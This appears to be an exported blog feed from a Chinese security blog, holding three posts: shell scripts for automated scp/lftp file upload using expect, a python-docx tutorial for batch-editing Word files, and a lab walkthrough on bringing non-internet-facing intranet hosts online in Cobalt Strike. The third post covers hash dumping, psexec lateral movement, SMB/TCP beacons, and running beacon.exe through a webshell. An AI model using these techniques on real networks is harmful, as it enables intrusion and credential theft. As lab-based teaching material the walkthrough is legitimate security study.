class="meta">	#</span><span class="bash">建立ftp连接</span></span><br><span class="line">	lftp -u $&#123;user&#125;,$&#123;password&#125; sftp://$&#123;ip&#125;:$&#123;port&#125; &lt;&lt;EOF</span><br><span class="line">cd $&#123;server_url&#125;/</span><br><span class="line">lcd $&#123;local_url&#125;</span><br><span class="line">put $&#123;file&#125;</span><br><span class="line">by</span><br><span class="line">EOF</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>到这里，我以为就搞定了，开开心心发过去，看了看点，三踮几啦，饮茶先啦，点了杯奶茶。不出意外要出意外了，客户说他那边没lftp这个服务，问我能不能用SCP服务，他们之前用的SCP服务，到手的奶茶突然不香了，也行！不就是SCP嘛，开整！也就是改下服务的事情。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">用户名</span></span><br><span class="line">user=</span><br><span class="line"><span class="meta">#</span><span class="bash">本地存在这个文件的目录</span></span><br><span class="line">local_url=/tmp</span><br><span class="line"><span class="meta">#</span><span class="bash">上传的目的目录</span></span><br><span class="line">server_url=/home</span><br><span class="line"><span class="meta">#</span><span class="bash">服务器IP</span></span><br><span class="line">ip=</span><br><span class="line"><span class="meta">#</span><span class="bash">端口</span></span><br><span class="line">port=22</span><br><span class="line"></span><br><span class="line">cd $&#123;local_url&#125;</span><br><span class="line">files=`find $&#123;local_url&#125; -mmin -50 -name &#x27;*.xml&#x27;`</span><br><span class="line">for file in $&#123;files&#125;</span><br><span class="line">do</span><br><span class="line">	echo $&#123;file&#125;</span><br><span class="line">	scp -P $&#123;port&#125; $&#123;file&#125; $&#123;user&#125;@$&#123;ip&#125;:$&#123;server_url&#125; &lt;&lt;EOF</span><br><span class="line">by</span><br><span class="line">EOF</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>这个的功能实现了，但是跟FTP不一样的是，FTP能够在命令中把密码加进去，而SCP需要自己输入密码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lftp -u $&#123;user&#125;,$&#123;password&#125; sftp://$&#123;ip&#125;:$&#123;port&#125; &lt;&lt;EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">账号密码在命令上</span></span><br><span class="line">scp -P $&#123;port&#125; $&#123;file&#125; $&#123;user&#125;@$&#123;ip&#125;:$&#123;server_url&#125; &lt;&lt;EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">账号密码需要自己输入</span></span><br></pre></td></tr></table></figure>

<p>客户看到又有问题了，啊这，能不能让他自己输入密码啊，我这不支持输入密码。也行，用expect写个监测关键字就行了，我没想到就是因为我这句也行，让我头秃了两天。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/expect</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ip=`ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|tr -d <span class="string">&quot;addr:&quot;</span>`</span></span><br><span class="line">spawn scp -P 22 /home/ax/a.xml 用户名@服务器IP:/tmp</span><br><span class="line">set timeout 20</span><br><span class="line"><span class="meta">#</span><span class="bash">监测下面的命令行中有没有password这个关键字</span></span><br><span class="line">expect &quot;password&quot;</span><br><span class="line">exec sleep 1</span><br><span class="line"><span class="meta">#</span><span class="bash">监测到了就发送密码</span></span><br><span class="line">send &quot;密码\r&quot;</span><br><span class="line">interact</span><br></pre></td></tr></table></figure>

<p>这个只是实现了一部分的功能，上面我说到，跑完主机之后的数据文件是带本机IP的，所以我们需要找到我们的本机IP，而关键点就在这，如果我要使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip=`ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk &#x27;&#123;print $2&#125;&#x27;|tr -d &quot;addr:&quot;`</span><br></pre></td></tr></table></figure>

<p>这句命令来找IP的话，我需要用到bash解释器里面的东西，而我用expect是需要用到/usr/bin/expect这个解释器，而这两个是没办法直接引用到上面的，也就是一个shell脚本无法直接使用两个解释器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/expect</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>找了两天的解决办法，什么方式都尝试了一遍，文件包含，命令行传参啥的都尝试了，都没办法，我甚至午休躺在椅子上面睡觉还梦到有别的解决办法，然后惊醒，本来已经打算跟客户说让他用ftp那个的时候，我偶然看到一个代码块，里面有个词引起了我的注意，内嵌类型！！！！！！当时就感觉有戏，好像我找的方式就是他，让仔细查了下内嵌类型是个啥，果然！！！！我只需要把我需要用到解释器的部分代码内嵌到我另一个解释器的代码里面，就可以了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">local_ip=`ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk &#x27;&#123;print $2&#125;&#x27;|tr -d &quot;addr:&quot;`</span><br><span class="line"><span class="meta">#</span><span class="bash">用户名</span></span><br><span class="line">user=</span><br><span class="line"><span class="meta">#</span><span class="bash">密码</span></span><br><span class="line">password=</span><br><span class="line"><span class="meta">#</span><span class="bash">本地存在这个文件的目录，格式例如/home/ax/</span></span><br><span class="line">local_url=</span><br><span class="line"><span class="meta">#</span><span class="bash">上传的目的目录,格式：/tmp</span></span><br><span class="line">server_url=</span><br><span class="line"><span class="meta">#</span><span class="bash">端口</span></span><br><span class="line">port=22</span><br><span class="line"><span class="meta">#</span><span class="bash">服务器IP</span></span><br><span class="line">server_ip=</span><br><span class="line"><span class="meta">#</span><span class="bash">这里一定要加&lt;&lt;<span class="string">EOF,才能将另一个解释器的代码内嵌到这里来</span></span></span><br><span class="line">/usr/bin/expect &lt;&lt;EOF</span><br><span class="line">spawn scp -P $&#123;port&#125; $&#123;local_url&#125;$&#123;local_ip&#125;_a.xml $&#123;user&#125;@$&#123;server_ip&#125;:$&#123;server_url&#125;</span><br><span class="line">set timeout 20</span><br><span class="line">expect &quot;password&quot;</span><br><span class="line">exec sleep 2</span><br><span class="line">send &quot;$&#123;password&#125;\r&quot;</span><br><span class="line">interact</span><br><span class="line">expect eof</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">结尾的时候要把EOF</span>给结束掉，也就是将上面的代码包进来</span></span><br></pre></td></tr></table></figure>

<p>这样直接把过滤文件的方式已经自动输入密码给完成了，其实如果想要实现那些自动上传脚本，执行这些也是能完成的，只要解决了两个解释器命令能够在同一个脚本里面执行，其他都很好解决，设计好逻辑思路就可以了，但是这个是属于被白嫖的服务，能少点需求就少点需求。</p>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>word文档批量处理脚本</title>
    <url>/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>公司让去客户现场了，去了那边的工作不是很难，但是很繁琐，特别是word的文档处理这块，经常要处理几十个文档就很烦，挣扎了下还是打算写个脚本来批量处理这些事情，总不能因为这些事情耽误了自己进步（摸鱼）吧？由于之前没接触过py在word文档处理这块的东西，所以还是踩了一些坑的，写一下，后续有用到可以避避坑。</p>
<span id="more"></span>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>老样子，一开始还是先思考下，如果正常操作，我们会如何操作，然后根据这些操作去构思我们的路线，所有的方便都不会是直接来的，不是一两个函数就能解决的事情，就好像3D打印，你没构图，3D打印也没办法打出你想要的东西出来，所以一开始我构思了三条路线：</p>
<p>一：直接定位里面的内容，然后删除，插入自己想要的；</p>
<p>二：把我想要的内容独立做成一个文档，然后定位内容，把老的删除，删除之后粘贴新的；</p>
<p>三：将原文档的内容进行切块，然后再把自己想要的内容独立成一些文档，然后再把每个文档进行拼接，得到新的文档；</p>
<p>其实还有其他的思路，但是有点太过繁琐，后面我在实现的过程中发现实际上不需要那么复杂，是自己想太多了，后面会谈到，那么先说下第一个思路，简单易懂对吧，但是具体实现起来，发现删除了之后，我重新写进去的数据，会丢失之前的格式，而py的docx对于格式方面虽然说可以赋予格式，但是没办法跟真正的word一样去设置每一部分的格式，而且有一些是不存在的，所以这块就十分的麻烦，如果你的文档不存在格式的问题，就简简单单的文字，那完全可以根据这个思路去做，而且很方便。第二个思路的话，有个很重要的点就是，定位可以定位，但是粘贴新的内容的时候，他会跟在文档末尾，也就是说，如果你想要粘贴的在文档中间，那没办法去直接粘贴到指定位置（PS：没怎么接触这个，我就只是为了实现这个东西，才去看了下，如果有话，是小弟太菜了），第三个思路的话，乍一看似乎可以得到我们想要的东西，但是如果文件量多起来的话，问题在于怎么去做到准确切割自己想要的东西。</p>
<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>多说无益，动手才知道坑在哪，如果要批量转化word的话，那么第一步肯定是先拿到我们文件夹里面的文件，然后再轮询，这个可以先不管，先试试能不能修改word里面的内容，ok，这里经过一系列的百度之后，我发现了python的一个很神奇的库—python-docx，用于创建可修改微软Word的一个python库，提供全套的 Word操作，是最常用的Word工具，而且能保留我们原有的格式，那这不是直接起飞？？？</p>
<p>在开始使用之前，先说下关于word的一些概念：</p>
<ul>
<li><code>Document</code>：是一个 Word 文档 对象，不同于 VBA 中 Worksheet 的概念，Document 是独立的，打开不同的 Word 文档，就会有不同的 Document 对象，相互之间没有影响</li>
<li><code>Paragraph</code>：是段落，一个 Word 文档由多个段落组成，当在文档中输入一个回车键，就会成为新的段落，输入 shift + 回车，不会分段</li>
<li><code>Run</code> 表示一个节段，每个段落由多个 节段 组成，一个段落中具有相同样式的连续文本，组成一个节段，所以一个 段落 对象有个 Run 列表</li>
</ul>
<p>也就是说word 文档内容的结构是这样划分的：</p>
<p><img src="https://ax-x.github.io/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/1.png" alt="1"></p>
<p>第二个 段落（paragraph），没有内容，所以 节段（run）为空，了解到这，也基本上知道如何去定位我们想要的数据了，先轮询paragraph，然后在这个paragraph里面去轮询run，从而拿到我们的要的数据，说干就干，直接上，就拿上面的概念为文本，我们写个代码块去遍历这些段落，然后输出出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> docx <span class="keyword">import</span> Document</span><br><span class="line"></span><br><span class="line">tpl_doc=<span class="string">&#x27;title.docx&#x27;</span></span><br><span class="line">doc = Document(tpl_doc)</span><br><span class="line"><span class="keyword">for</span> paragraph <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">    <span class="built_in">print</span>(paragraph.text)</span><br></pre></td></tr></table></figure>

<p>输出结果是这样的：</p>
<p><img src="https://ax-x.github.io/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/image-20220513091808872-16524046932521.png" alt="image-20220513091808872"></p>
<p>这就是每一段的内容，再遍历每一段里面的run块出来</p>
<p><img src="https://ax-x.github.io/2022/05/13/word%E6%96%87%E6%A1%A3%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/image-20220513094744241-16524064658883.png" alt="image-20220513094744241"></p>
<p>可以看到run的区分不是根据词语的，而是根据写入的时间节点，如果时间节点不一样，那么run的内容就不一样，同一段文字，可能写入的时间节点不一致，遍历run的时候结果也不一样，这点暂时没办法解决，目前能想到的就是遍历的时候组合文字，当匹配出自己想要的文之后再进行替换。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">       <span class="string">&quot;原文RUN-A&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">       <span class="string">&quot;原文RUN-B&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">       <span class="string">&quot;原文RUN-C&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">       <span class="string">&quot;原文RUN-D&quot;</span>: <span class="string">&quot;替换的文字&quot;</span>,</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> paragraph <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">       <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">           pv = <span class="built_in">str</span>(params[param])</span><br><span class="line">           ph = <span class="string">f&#x27;<span class="subst">&#123;param&#125;</span>&#x27;</span></span><br><span class="line">           <span class="keyword">if</span> ph <span class="keyword">in</span> paragraph.text:</span><br><span class="line">               <span class="keyword">for</span> run <span class="keyword">in</span> paragraph.runs:</span><br><span class="line">                   <span class="keyword">if</span> ph <span class="keyword">in</span> run.text:</span><br><span class="line">                       run.text = run.text.replace(ph, pv)</span><br><span class="line">                       run.italic = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>这些能有效处理开头和中间的文字，而且这种方式替换的话，不会去掉文章原有的格式，而如果有需要替换大量的文字段落在文章末的时候，可以将文末需要替换的文字删除，需要删除空行，普通的clean命令只是将内容删除，而不会去除换行，所以删除之后会存在空行的情况 ，这时候如果复制另外一个文档的内容接入到文末的话，他会接在空行后面，所以需要删除空行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> paragraph <span class="keyword">in</span> doc.paragraphs:</span><br><span class="line">    <span class="keyword">if</span>(paragraph.text==<span class="string">&quot;段落内容&quot;</span>):</span><br><span class="line">        p = paragraph._element</span><br><span class="line">        p.getparent().remove(p)</span><br><span class="line">        p._p = p._element = <span class="literal">None</span></span><br><span class="line"><span class="comment">#这部分是遍历段落，将文末需要替换的段落进行删除去除空行，方便后续将另一个文件的内容复制进来</span></span><br></pre></td></tr></table></figure>

<p>这里有一点就是，把其他文档里面的内容合并到这个文档的时候，其他文档里面的文字内容格式是不会变的，这也跟我们最初的想法一致，保留原有的格式，所以可以直接使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bottom_title = <span class="string">&#x27;bottom.docx&#x27;</span></span><br><span class="line">bottom_document = Document(bottom_title)</span><br><span class="line">master = Document(<span class="string">&#x27;old_docx.docx&#x27;</span>)</span><br><span class="line">middle_new_docx = Composer(master)</span><br><span class="line">middle_new_docx.append(bottom_document)</span><br><span class="line">filename = old_docx.docx</span><br><span class="line"><span class="built_in">print</span>(filename)</span><br><span class="line">middle_new_docx.save(filename)</span><br></pre></td></tr></table></figure>

<p>到这基本需要替换的就能够替换掉，并且保留文档格式了，但是有一点就是，去除空行不能够遍历全文，最好就是先定位到位置，再增加判断条件，不然容易将图片内容删除，因为当你遍历段落的时候，图片独占一行的时候该段落是空的，所以会将图片给删除掉，可以额外加一个判断，当存在图片的时候，该段落的run值是为0，而不存在图片单纯一个空行的时候，run是不存在任何值的。</p>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>自动化脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>不出网主机的几种上线方式</title>
    <url>/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿到一台边缘机器后，内网的机器很有可能大多数都不出网，这时又想上线cs方便后续操作。本文就如何上线不出网主机的方式进行了总结。</p>
<span id="more"></span>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="目标内网机器"><a href="#目标内网机器" class="headerlink" title="目标内网机器"></a>目标内网机器</h3><ul>
<li>os：win server 2012</li>
<li>ip：192.168.57.137</li>
</ul>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0136c4d3e3999c5caf.png" alt="img"></p>
<p>边缘机器</p>
<ul>
<li>os：win server 2012</li>
<li>ip1：192.168.1.103（出网）</li>
<li>ip2：192.168.57.136</li>
</ul>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01c9155db0479a0e48.png" alt="img"></p>
<h3 id="攻击机器"><a href="#攻击机器" class="headerlink" title="攻击机器"></a>攻击机器</h3><ul>
<li>os：kali liunx</li>
<li>ip：192.168.1.128</li>
</ul>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0102e7b40d17335b25.png" alt="img"></p>
<ul>
<li>os：ubutu 16.04</li>
<li>vps ip：47.xxxxxxxx</li>
</ul>
<p>由于边缘主机出网，选择reverse反向连接，现在已经上线边缘主机</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0185a759e9da61208c.png" alt="img"></p>
<h2 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h2><p>该方法通过已有的父Beacon使用SMB协议进行正向连接不出网机器，要求目标开启445端口，通过命名管道进行认证即可上线。其实有点像psexec这样的工具，有用户名和hash后，即可执行远程命令，其原理相似。内网的机器密码相同的情况很多，这也是为什么现在为了提高安全性不能批量设置密码，内网渗透一但有了密码往往有时候就宣告结束。</p>
<p>并且有个好处就是SMB协议一般防火墙是不拦截的，在一定程度上可以规避防火墙拦截。</p>
<p>先使用hashdump和logonpasswords命令抓一波密码。由于这里是win2012系统，是无法直接抓取明文密码的，这里也不需要去修改注册表，或者通过mimilib.dll注入的方式去获取明文密码，有hash就足够了，SMB验证身份本身用的就是NTMLv2协议。</p>
<p>这里是抓到了该机器上的hash</p>
<blockquote>
<p>有个小tips，如果对方机器是64位的，最好就用x64的exe上线就可以了，以前我觉得x32和x64都行。虽然都可以上线，但是如果用的是x32的beacon，很有可能是抓不到64位机器上的密码的，使用cs集成的mimikatz会提示：32位的mimikatz无法抓取到64位机器的密码。所以目标是最好就用64位就用64位的artifact。</p>
</blockquote>
<p>然后通过端口扫描，发现内网机器：</p>
<p>到这里不懂原理的小白(我)可能就会直接使用cs自带的psexec功能直接去横向，恰巧我之前就是这么做的，想起来还挺有意思的。</p>
<p>结果就是服务已经创建了，但是上不了线，那会儿自己心里想肯定是cs出bug了，还烦了一会儿，现在想起来还挺有意思的。</p>
<p>本身是没有问题的，说明psexec已经成功的完成了ntml认证，并且认证成功，但是这时候shell是反弹给边缘机器的，如果要上线就要再新建一个SMB Beacon Listener。相当于通过边缘机器再中转一下，反弹shell到vps。</p>
<p>选择子Beacon：SMB Beacon。成功上线。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01a9823f07373d94f1.png" alt="img"></p>
<p>（出去吃个饭回来内网机器ip变了。。）</p>
<p>这里可以看下拓扑图，是通过边缘机器正向连接了不出网的内网主机。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0107b4d4325abce982.png" alt="img"></p>
<p>在external后面有一个oooo，这实际上是标明了当前SMB的连接状态：</p>
<blockquote>
<p>SMB Beacon有两个命令：link，unlink。</p>
</blockquote>
<p>unlink则会断开连接，link会重新连接</p>
<p>执行命令unlink</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">unlink</span> <span class="number">192.168.57.140</span></span><br></pre></td></tr></table></figure>

<p>后面的oooo变成了oo oo，说明已经断开连接，但是只是断开了连接，进程并没有被杀掉。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01cfd5fb064d8aefa7.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01b4e6f189e53d7e22.png" alt="img"></p>
<p>使用命令重新回连：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">link</span> <span class="number">192.168.57.140</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t013251e9762f0870af.png" alt="img"></p>
<blockquote>
<p>我在实战中暂时没有用到过这个功能，但应该是有一定作用的，持久化后门，更加隐蔽？这里具体的实战情景明白的师傅可以说一下。</p>
</blockquote>
<h2 id="TCP-Beacon"><a href="#TCP-Beacon" class="headerlink" title="TCP Beacon"></a>TCP Beacon</h2><p>这种方式一般试用于：密码撞不上，内网机器有web服务。</p>
<p>这里做个代理，假设已经写入了shell文件，用冰蝎挂代理去连webshell。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01b78a2eb546d849b8.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01263d4d607a2c6917.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01b99db35da21d225e.png" alt="img"></p>
<p>在cs上新增一个Listen，Tcp Beacon</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t010acf5427fc6e9f0c.png" alt="img"></p>
<p>横向的时候最好都使用这个带s的windows可执行文件，s的含义为Stageless，相对的是Stager。下面是我自己的理解：</p>
<blockquote>
<p>Stager是分步式，分阶段的，只用少部分代码来请求和加载payload，cs的加载payload模式为反射加载beacon.dll，但这个beacon.dll并不在可执行文件中，而是在远程C2服务端。</p>
<p>Stageless则是将beacon.dll包含在可执行文件中，并且可能有写额外的操作，于是文件比较大，特征也更明显，但是适合横向不出网机器，因为不出网所以有可能请求不了c2服务端上的beacon.dll。</p>
</blockquote>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t012ac4841f86216310.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01feff5208e2e2a26c.png" alt="img"></p>
<p>Stageless的可执行文件比Stager的可执行文件大了将近15倍。真的离谱。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01840617d36881e092.png" alt="img"></p>
<p>然后用冰蝎上传beacon.exe。然后执行</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0132848590c9c8a8cc.png" alt="img"></p>
<p>执行后使用connect 命令连接：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">connect</span> <span class="number">192.168.57.140</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0144f9cccbedfb8132.png" alt="img"></p>
<p>拓扑图如下，为tcp正向连接：</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01c4788838e1ee9c89.png" alt="img"></p>
<p>同样是可以使用unlink来断开连接，这里与SMB Beacon不一样的是，如果Beacon进程是以普通权限运行的话，进程会直接死掉，再connect就会失败。</p>
<p>这里由于是Administrator权限，unlink后可以通过connect重新连接回来。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t019a0d694dbfef7718.png" alt="img"></p>
<h2 id="Reverse-TCP-Beacon"><a href="#Reverse-TCP-Beacon" class="headerlink" title="Reverse TCP Beacon"></a>Reverse TCP Beacon</h2><p>也可以被称为中继上线。</p>
<p>同样需要有内网web，传shell。右键跳板机shell，选择Pivoting-&gt;Listener。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t017374758310808e90.png" alt="img"></p>
<p>Listen Host为内网ip。</p>
<p>这里要注意一下，如果有多张网卡，这个默认的Listen Host是需要改的，需要填入同一网段的ip。</p>
<p>比如我这里的跳板机器就有两张网卡，默认填入的host是192.168.1.103，这个就需要改，因为内网不出网机器是无法访问到192.168.1.103这张网卡的，只能访问192.168.57.143（跳板机ip又变了）</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01cf002e13a2f3fbb7.png" alt="img"></p>
<p>同样生成Stageless的可执行文件。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t011128b19f55288014.png" alt="img"></p>
<p>上传后执行beacon.exe</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t013fddc56341f858f0.png" alt="img"></p>
<p>执行后回来看cs就已经上线，不需要link或者connect了。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0165d6437104bf123c.png" alt="img"></p>
<p>拓扑图为反向的tcp连接</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01ffbea793574ec96c.png" alt="img"></p>
<p>值得注意的是，中继方法无法unlink后重连，不管权限如何，一旦unlink后进程直接结束。要想重新上线只能重新执行beacon.exe。</p>
